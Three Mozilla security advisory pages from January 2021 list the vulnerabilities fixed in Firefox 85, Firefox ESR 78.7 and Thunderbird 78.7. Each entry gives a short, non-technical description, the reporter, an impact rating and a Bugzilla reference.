=== Content from www.mozilla.org_7358fcf7_20250115_084521.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2021-03

## Security Vulnerabilities fixed in Firefox 85

Announced
January 26, 2021
Impact
high
Products
Firefox
Fixed in

* Firefox 85

#### [#CVE-2021-23953: Cross-origin information leakage via redirected PDF requests](#CVE-2021-23953)

Reporter
Rob Wu
Impact
high
##### Description

If a user clicked into a specifically crafted PDF, the PDF reader could be confused into leaking cross-origin information, when said information is served as chunked data.

##### References

* [Bug 1683940](https://bugzilla.mozilla.org/show_bug.cgi?id=1683940)

#### [#CVE-2021-23954: Type confusion when using logical assignment operators in JavaScript switch statements](#CVE-2021-23954)

Reporter
Gary Kwong
Impact
high
##### Description

Using the new logical assignment operators in a JavaScript switch statement could have caused a type confusion, leading to a memory corruption and a potentially exploitable crash.

##### References

* [Bug 1684020](https://bugzilla.mozilla.org/show_bug.cgi?id=1684020)

#### [#CVE-2021-23955: Clickjacking across tabs through misusing requestPointerLock](#CVE-2021-23955)

Reporter
Irvan Kurniawan
Impact
high
##### Description

The browser could have been confused into transferring a pointer lock state into another tab, which could have lead to clickjacking attacks.

##### References

* [Bug 1684837](https://bugzilla.mozilla.org/show_bug.cgi?id=1684837)

#### [#CVE-2021-23956: File picker dialog could have been used to disclose a complete directory](#CVE-2021-23956)

Reporter
Abdulrahman Alqabandi
Impact
moderate
##### Description

An ambiguous file picker design could have confused users who intended to select and upload a single file into uploading a whole directory. This was addressed by adding a new prompt.

##### References

* [Bug 1338637](https://bugzilla.mozilla.org/show_bug.cgi?id=1338637)

#### [#CVE-2021-23957: Iframe sandbox could have been bypassed on Android via the intent URL scheme](#CVE-2021-23957)

Reporter
Eliya Stein
Impact
moderate
##### Description

Navigations through the Android-specific `intent` URL scheme could have been misused to escape iframe sandbox.
*Note: This issue only affected Firefox for Android. Other operating systems are unaffected.*

##### References

* [Bug 1584582](https://bugzilla.mozilla.org/show_bug.cgi?id=1584582)

#### [#CVE-2021-23958: Screen sharing permission leaked across tabs](#CVE-2021-23958)

Reporter
Jan-Ivar Bruaroey
Impact
moderate
##### Description

The browser could have been confused into transferring a screen sharing state into another tab, which would leak unintended information.

##### References

* [Bug 1642747](https://bugzilla.mozilla.org/show_bug.cgi?id=1642747)

#### [#CVE-2021-23959: Cross-Site Scripting in error pages on Firefox for Android](#CVE-2021-23959)

Reporter
Muneaki Nishimura
Impact
moderate
##### Description

An XSS bug in internal error pages could have led to various spoofing attacks, including other error pages and the address bar.
*Note: This issue only affected Firefox for Android. Other operating systems are unaffected.*

##### References

* [Bug 1659035](https://bugzilla.mozilla.org/show_bug.cgi?id=1659035)

#### [#CVE-2021-23960: Use-after-poison for incorrectly redeclared JavaScript variables during GC](#CVE-2021-23960)

Reporter
Irvan Kurniawan
Impact
moderate
##### Description

Performing garbage collection on re-declared JavaScript variables resulted in a user-after-poison, and a potentially exploitable crash.

##### References

* [Bug 1675755](https://bugzilla.mozilla.org/show_bug.cgi?id=1675755)

#### [#CVE-2021-23961: More internal network hosts could have been probed by a malicious webpage](#CVE-2021-23961)

Reporter
Samy Kamkar, Ben Seri, and Gregory Vishnepolsky
Impact
moderate
##### Description

Further techniques that built on the slipstream research combined with a malicious webpage could have exposed both an internal network's hosts as well as services running on the user's local machine.

##### References

* [Bug 1677940](https://bugzilla.mozilla.org/show_bug.cgi?id=1677940)

#### [#CVE-2021-23962: Use-after-poison in "nsTreeBodyFrame::RowCountChanged"](#CVE-2021-23962)

Reporter
Chiaki ISHIKAWA
Impact
low
##### Description

Incorrect use of the `RowCountChanged` method could have led to a user-after-poison and a potentially exploitable crash.

##### References

* [Bug 1677194](https://bugzilla.mozilla.org/show_bug.cgi?id=1677194)

#### [#CVE-2021-23963: Permission prompt inaccessible after asking for additional permissions](#CVE-2021-23963)

Reporter
Paul Zühlcke
Impact
low
##### Description

When sharing geolocation during an active WebRTC share, Firefox could have reset the webRTC sharing state in the user interface, leading to loss of control over the currently granted permission

##### References

* [Bug 1680793](https://bugzilla.mozilla.org/show_bug.cgi?id=1680793)

#### [#CVE-2021-23964: Memory safety bugs fixed in Firefox 85 and Firefox ESR 78.7](#CVE-2021-23964)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Andrew McCreight, Tyson Smith, Jesse Schwartzentruber, Jon Coppeard, Byron Campen, André Bargull, Steve Fink, Jason Kratzer, Christian Holler, Alexis Beingessner reported memory safety bugs present in Firefox 84 and Firefox ESR 78.6. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 85 and Firefox ESR 78.7](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1662507%2C1666285%2C1673526%2C1674278%2C1674835%2C1675097%2C1675844%2C1675868%2C1677590%2C1677888%2C1680410%2C1681268%2C1682068%2C1682938%2C1683736%2C1685260%2C1685925)

#### [#CVE-2021-23965: Memory safety bugs fixed in Firefox 85](#CVE-2021-23965)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Sebastian Hengst, Christian Holler, Tyson Smith reported memory safety bugs present in Firefox 84. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 85](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1670378%2C1673555%2C1676812%2C1678582%2C1684497)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_a1fe0c3c_20250115_084521.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2021-04

## Security Vulnerabilities fixed in Firefox ESR 78.7

Announced
January 26, 2021
Impact
high
Products
Firefox ESR
Fixed in

* Firefox ESR 78.7

#### [#CVE-2021-23953: Cross-origin information leakage via redirected PDF requests](#CVE-2021-23953)

Reporter
Rob Wu
Impact
high
##### Description

If a user clicked into a specifically crafted PDF, the PDF reader could be confused into leaking cross-origin information, when said information is served as chunked data.

##### References

* [Bug 1683940](https://bugzilla.mozilla.org/show_bug.cgi?id=1683940)

#### [#CVE-2021-23954: Type confusion when using logical assignment operators in JavaScript switch statements](#CVE-2021-23954)

Reporter
Gary Kwong
Impact
high
##### Description

Using the new logical assignment operators in a JavaScript switch statement could have caused a type confusion, leading to a memory corruption and a potentially exploitable crash.

##### References

* [Bug 1684020](https://bugzilla.mozilla.org/show_bug.cgi?id=1684020)

#### [#CVE-2020-26976: HTTPS pages could have been intercepted by a registered service worker when they should not have been](#CVE-2020-26976)

Reporter
Andrew Sutherland
Impact
moderate
##### Description

When a HTTPS page was embedded in a HTTP page, and there was a service worker registered for the former, the service worker could have intercepted the request for the secure page despite the iframe not being a secure context due to the (insecure) framing.

##### References

* [Bug 1674343](https://bugzilla.mozilla.org/show_bug.cgi?id=1674343)

#### [#CVE-2021-23960: Use-after-poison for incorrectly redeclared JavaScript variables during GC](#CVE-2021-23960)

Reporter
Irvan Kurniawan
Impact
moderate
##### Description

Performing garbage collection on re-declared JavaScript variables resulted in a user-after-poison, and a potentially exploitable crash.

##### References

* [Bug 1675755](https://bugzilla.mozilla.org/show_bug.cgi?id=1675755)

#### [#CVE-2021-23964: Memory safety bugs fixed in Firefox 85 and Firefox ESR 78.7](#CVE-2021-23964)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Alexis Beingessner, Christian Holler, Andrew McCreight, Tyson Smith, Jon Coppeard, André Bargull, Jason Kratzer, Jesse Schwartzentruber, Steve Fink, Byron Campen reported memory safety bugs present in Firefox 84 and Firefox ESR 78.6. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 85 and Firefox ESR 78.7](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1662507%2C1666285%2C1673526%2C1674278%2C1674835%2C1675097%2C1675844%2C1675868%2C1677590%2C1677888%2C1680410%2C1681268%2C1682068%2C1682938%2C1683736%2C1685260%2C1685925)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_28d77cda_20250115_084522.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2021-05

## Security Vulnerabilities fixed in Thunderbird 78.7

Announced
January 26, 2021
Impact
high
Products
Thunderbird
Fixed in

* Thunderbird 78.7

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2021-23953: Cross-origin information leakage via redirected PDF requests](#CVE-2021-23953)

Reporter
Rob Wu
Impact
high
##### Description

If a user clicked into a specifically crafted PDF, the PDF reader could be confused into leaking cross-origin information, when said information is served as chunked data.

##### References

* [Bug 1683940](https://bugzilla.mozilla.org/show_bug.cgi?id=1683940)

#### [#CVE-2021-23954: Type confusion when using logical assignment operators in JavaScript switch statements](#CVE-2021-23954)

Reporter
Gary Kwong
Impact
high
##### Description

Using the new logical assignment operators in a JavaScript switch statement could have caused a type confusion, leading to a memory corruption and a potentially exploitable crash.

##### References

* [Bug 1684020](https://bugzilla.mozilla.org/show_bug.cgi?id=1684020)

#### [#CVE-2020-15685: IMAP Response Injection when using STARTTLS](#CVE-2020-15685)

Reporter
Damian Poddebniak
Impact
moderate
##### Description

During the plaintext phase of the STARTTLS connection setup, protocol commands could have been injected and evaluated within the encrypted session.

##### References

* [Bug 1622640](https://bugzilla.mozilla.org/show_bug.cgi?id=1622640)

#### [#CVE-2020-26976: HTTPS pages could have been intercepted by a registered service worker when they should not have been](#CVE-2020-26976)

Reporter
Andrew Sutherland
Impact
moderate
##### Description

When a HTTPS page was embedded in a HTTP page, and there was a service worker registered for the former, the service worker could have intercepted the request for the secure page despite the iframe not being a secure context due to the (insecure) framing.

##### References

* [Bug 1674343](https://bugzilla.mozilla.org/show_bug.cgi?id=1674343)

#### [#CVE-2021-23960: Use-after-poison for incorrectly redeclared JavaScript variables during GC](#CVE-2021-23960)

Reporter
Irvan Kurniawan
Impact
moderate
##### Description

Performing garbage collection on re-declared JavaScript variables resulted in a user-after-poison, and a potentially exploitable crash.

##### References

* [Bug 1675755](https://bugzilla.mozilla.org/show_bug.cgi?id=1675755)

#### [#CVE-2021-23964: Memory safety bugs fixed in Thunderbird 78.7](#CVE-2021-23964)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Alexis Beingessner, Christian Holler, Andrew McCreight, Tyson Smith, Jon Coppeard, André Bargull, Jason Kratzer, Jesse Schwartzentruber, Steve Fink, Byron Campen reported memory safety bugs present in Thunderbird 78.6. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Thunderbird 78.7](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1662507%2C1666285%2C1673526%2C1674278%2C1674835%2C1675097%2C1675844%2C1675868%2C1677590%2C1677888%2C1680410%2C1681268%2C1682068%2C1682938%2C1683736%2C1685260%2C1685925)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
